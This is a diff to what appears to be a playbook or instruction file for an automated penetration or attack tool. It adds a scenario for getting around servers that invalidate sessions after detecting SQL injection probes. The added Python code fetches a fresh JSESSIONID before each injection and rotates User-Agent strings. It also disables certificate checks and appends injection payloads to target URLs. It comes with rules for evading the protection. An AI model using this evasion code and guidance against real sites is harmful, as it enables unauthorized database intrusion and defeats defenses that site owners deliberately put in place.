@@ -431,6 +431,61 @@ SCENARIO C — Java target (.do endpoints, JSESSIONID):
   4. Java SQL: Oracle or MySQL — test with ROWNUM (Oracle) vs LIMIT (MySQL)
   5. If menu_id=120 returns 307: find a menu_id that returns 200 first
 
+SCENARIO C2 — Session invalidation after SQLi detection (status=-1 / 0B pattern):
+  SYMPTOM: Baseline returns 200 (large body), then ALL subsequent requests return
+           status=-1 or 0B (connection error / timeout).
+  CAUSE: Server detected SQLi probe and INVALIDATED the session (JSESSIONID blocked).
+  THIS IS NOT AN IP BAN — it's per-session protection.
+
+  SOLUTION — Fresh session per injection attempt:
+  ```python
+  import urllib.request, ssl, re, time, random
+
+  ssl._create_default_https_context = ssl._create_unverified_context
+  BASE_URL = "https://target.com/"
+
+  def get_fresh_session():
+      """새 JSESSIONID 발급받기 — 매 주요 테스트 전에 호출"""
+      req = urllib.request.Request(BASE_URL, headers={
+          "User-Agent": random.choice(UA_LIST),
+          "Accept": "text/html,*/*",
+      })
+      resp = urllib.request.urlopen(req, timeout=10)
+      # Set-Cookie에서 JSESSIONID 추출
+      cookies = resp.headers.get("Set-Cookie", "")
+      m = re.search(r"JSESSIONID=([A-F0-9]+)", cookies, re.I)
+      return m.group(1) if m else None
+
+  def safe_inject(url, payload, session_id=None):
+      """세션 자동 갱신 포함 인젝션"""
+      if session_id is None:
+          session_id = get_fresh_session()
+          time.sleep(0.5)
+      try:
+          req = urllib.request.Request(url + payload, headers={
+              "Cookie": f"JSESSIONID={session_id}",
+              "User-Agent": random.choice(UA_LIST),
+          })
+          resp = urllib.request.urlopen(req, timeout=10)
+          body = resp.read()
+          return resp.status, len(body), body
+      except Exception as e:
+          return -1, 0, b""
+  ```
+
+  KEY RULES for session-invalidating sites:
+  - NEVER reuse a session after it returned 0B/error
+  - Get fresh JSESSIONID before EACH boolean oracle test
+  - Add time.sleep(1~2) between session acquisition and injection
+  - Use different endpoint for session warmup vs injection endpoint
+  - If EVERY fresh session also returns -1: IP is blocked (not session)
+
+=== [CRITICAL] SCRIPT BUG PREVENTION ===
+  list.append() takes EXACTLY ONE argument:
+    WRONG:  my_list.append(item1, item2, item3)
+    CORRECT: my_list.append((item1, item2, item3))  # use tuple
+  Always test append calls have exactly one argument.
+
 SCENARIO E — VPN environment (NETWORK_ENV section present in scan):
   bingo auto-detects VPN and reports in NETWORK_ENV section:
     - Exit IP: the real IP the target server sees
